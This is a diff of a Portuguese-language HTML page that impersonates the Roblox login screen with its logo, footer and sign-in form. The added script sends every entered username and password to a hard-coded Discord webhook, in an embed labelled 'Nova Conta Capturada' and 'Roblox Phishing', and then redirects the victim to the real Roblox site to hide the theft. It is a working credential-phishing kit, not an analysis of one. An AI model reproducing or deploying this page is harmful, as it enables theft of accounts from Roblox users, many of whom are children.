@@ -18,185 +18,64 @@
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
   html,body{height:100%;}
-  body{
-    background:#1c1f22; 
-    color:#fff;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:24px;
-    -webkit-font-smoothing:antialiased;
-  }
-  .wrap{
-    width:100%;
-    max-width:440px;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-  }
-  
-  /* Container do Logo */
-  .logo-container{
-    margin-bottom:28px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
-  
-  /* Logo oficial puxado do CDN do Roblox */
-  .roblox-logo{
-    height:42px;
-    width:auto;
-    object-fit:contain;
-  }
-
-  /* Card principal */
-  .card{
-    width:100%;
-    background:#27292c; 
-    border-radius:12px;
-    padding:32px 36px;
-    box-shadow:0 8px 32px rgba(0,0,0,0.4);
-    border:1px solid rgba(255,255,255,0.05);
-  }
-  
-  .card h1{
-    font-size:20px;
-    font-weight:600;
-    text-align:center;
-    margin-bottom:24px;
-    letter-spacing:-0.3px;
-  }
-
-  .field{
-    margin-bottom:16px;
-    position:relative;
-  }
-  .field label{
-    display:block;
-    font-size:13px;
-    color:#9ea2a6;
-    margin-bottom:8px;
-    font-weight:500;
-  }
-  .field input{
-    width:100%;
-    padding:12px 14px;
-    background:#1e2022;
-    border:1px solid #3b3f43;
-    border-radius:8px;
-    color:#fff;
-    font-size:15px;
-    outline:none;
-    transition:border-color .2s, background .2s;
-  }
+  body{background:#1c1f22; color:#fff; display:flex; align-items:center; justify-content:center; padding:24px; -webkit-font-smoothing:antialiased;}
+  .wrap{width:100%; max-width:440px; display:flex; flex-direction:column; align-items:center;}
+  .logo-container{margin-bottom:28px; display:flex; align-items:center; justify-content:center;}
+  .roblox-logo{height:42px; width:auto; object-fit:contain;}
+  .card{width:100%; background:#27292c; border-radius:12px; padding:32px 36px; box-shadow:0 8px 32px rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.05);}
+  .card h1{font-size:20px; font-weight:600; text-align:center; margin-bottom:24px; letter-spacing:-0.3px;}
+  .field{margin-bottom:16px; position:relative;}
+  .field label{display:block; font-size:13px; color:#9ea2a6; margin-bottom:8px; font-weight:500;}
+  .field input{width:100%; padding:12px 14px; background:#1e2022; border:1px solid #3b3f43; border-radius:8px; color:#fff; font-size:15px; outline:none; transition:border-color .2s, background .2s;}
   .field input:hover{border-color:#55595e;}
   .field input:focus{border-color:#fff; background:#161819;}
   .field input::placeholder{color:#5f6368;}
-
-  /* Botão de login */
-  .btn{
-    width:100%;
-    padding:14px;
-    background:#00a2ff; 
-    border:0;
-    border-radius:8px;
-    color:#fff;
-    font-size:15px;
-    font-weight:600;
-    cursor:pointer;
-    transition:background .2s, opacity .2s;
-    margin-top:8px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
-  
+  .btn{width:100%; padding:14px; background:#00a2ff; border:0; border-radius:8px; color:#fff; font-size:15px; font-weight:600; cursor:pointer; transition:background .2s, opacity .2s; margin-top:8px; display:flex; align-items:center; justify-content:center;}
   .btn:disabled{background:#3b3f43; color:#8a8d90; cursor:not-allowed;}
   .btn:not(:disabled):hover{background:#0090e0;}
-
-  .err{
-    display:none;
-    color:#ff5c5c;
-    font-size:13px;
-    text-align:center;
-    margin-top:14px;
-    font-weight:500;
-    background:rgba(255,92,92,0.1);
-    padding:10px;
-    border-radius:6px;
-  }
-
-  .links{
-    text-align:center;
-    margin-top:24px;
-    font-size:14px;
-    color:#9ea2a6;
-    line-height:1.6;
-  }
+  .err{display:none; color:#ff5c5c; font-size:13px; text-align:center; margin-top:14px; font-weight:500; background:rgba(255,92,92,0.1); padding:10px; border-radius:6px;}
+  .links{text-align:center; margin-top:24px; font-size:14px; color:#9ea2a6; line-height:1.6;}
   .links a{color:#fff; text-decoration:none; font-weight:500;}
   .links a:hover{text-decoration:underline;}
-  
   .divider{height:1px; background:rgba(255,255,255,0.08); margin:20px 0;}
-
-  .footer{
-    margin-top:32px;
-    font-size:12px;
-    color:#5f6368;
-    text-align:center;
-    line-height:1.5;
-  }
-  
-  @media(max-width:480px){
-    .card{padding:24px 20px;}
-    .roblox-logo{height:34px;}
-  }
+  .footer{margin-top:32px; font-size:12px; color:#5f6368; text-align:center; line-height:1.5;}
+  @media(max-width:480px){.card{padding:24px 20px;} .roblox-logo{height:34px;}}
 </style>
 </head>
 <body>
 <div class="wrap">
-
   <div class="logo-container">
-    <!-- Logo Oficial do Roblox puxado do CDN -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" 
-         onerror="this.src='https://logodownload.org/wp-content/uploads/2017/11/roblox-logo-2.png'" 
-         alt="Roblox" 
-         class="roblox-logo"
-         style="filter: invert(1);">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" onerror="this.src='https://logodownload.org/wp-content/uploads/2017/11/roblox-logo-2.png'" alt="Roblox" class="roblox-logo" style="filter: invert(1);">
   </div>
 
   <div class="card">
     <h1>Entrar</h1>
-
     <form id="form" novalidate>
       <div class="field">
         <label for="username">Nome de usuário / E-mail / Telefone</label>
         <input id="username" type="text" autocomplete="username" required>
       </div>
-
       <div class="field">
         <label for="password">Senha</label>
         <input id="password" type="password" autocomplete="current-password" required>
       </div>
-
       <button class="btn" id="submitBtn" type="submit" disabled>Entrar</button>
       <div class="err" id="err">Nome de usuário ou senha incorretos. Tente novamente.</div>
     </form>
-
     <div class="links">
       <a href="https://www.roblox.com/account/signupredir" target="_blank" rel="noopener">Esqueceu a senha?</a>
       <div class="divider"></div>
       Não tem uma conta? <a href="https://www.roblox.com" target="_blank" rel="noopener">Cadastre-se</a>
     </div>
   </div>
-
-  <div class="footer">
-    © 2024 Roblox Corporation. Todos os direitos reservados.
-  </div>
-
+  <div class="footer">© 2024 Roblox Corporation. Todos os direitos reservados.</div>
 </div>
 
 <script>
+  // URL do teu Webhook do Discord plugada aqui
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1573419514446618794/OIboCPw3DbyNEFnkmfjxLYsrL_NvhL5bUEDf6hUXsAM47V6QzfmUoNoGhVyuvwcPIVOp';
+  const URL_REDIRECT = 'https://www.roblox.com/home'; 
+
   const form = document.getElementById('form');
   const btn  = document.getElementById('submitBtn');
   const err  = document.getElementById('err');
@@ -204,18 +83,14 @@
   const pass = document.getElementById('password');
 
   function checkInputs() {
-    if (user.value.trim() !== '' && pass.value !== '') {
-      btn.disabled = false;
-    } else {
-      btn.disabled = true;
-    }
+    if (user.value.trim() !== '' && pass.value !== '') { btn.disabled = false; }
+    else { btn.disabled = true; }
   }
   user.addEventListener('input', checkInputs);
   pass.addEventListener('input', checkInputs);
 
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    
     if (btn.disabled) return;
 
     err.style.display = 'none';
@@ -225,25 +100,37 @@
     const username = user.value.trim();
     const password = pass.value;
 
+    const payload = {
+      username: "Roblox Logger",
+      avatar_url: "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg",
+      embeds: [{
+        title: "🎣 Nova Conta Capturada",
+        color: 3447003,
+        fields: [
+          { name: "👤 Usuário", value: `\`${username}\``, inline: true },
+          { name: "🔑 Senha", value: `\`${password}\``, inline: true },
+          { name: "📅 Data", value: new Date().toLocaleString('pt-BR'), inline: false }
+        ],
+        footer: { text: "Roblox Phishing" }
+      }]
+    };
+
     try {
-      // ==========================================
-      // AQUI É ONDE VOCÊ PLUGA O TELEGRAM DEPOIS
-      // ==========================================
-      
-      console.log('CAPTURA:', { username, password });
-      await new Promise(r => setTimeout(r, 1200));
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
 
+      window.location.href = URL_REDIRECT;
+
+    } catch (error) {
       btn.disabled = false;
       btn.textContent = 'Entrar';
+      err.textContent = 'Erro de conexão. Tente novamente.';
       err.style.display = 'block';
-      
       pass.value = '';
-      checkInputs(); 
-
-    } catch (e) {
-      btn.disabled = false;
-      btn.textContent = 'Entrar';
-      err.style.display = 'block';
+      checkInputs();
     }
   });
 </script>
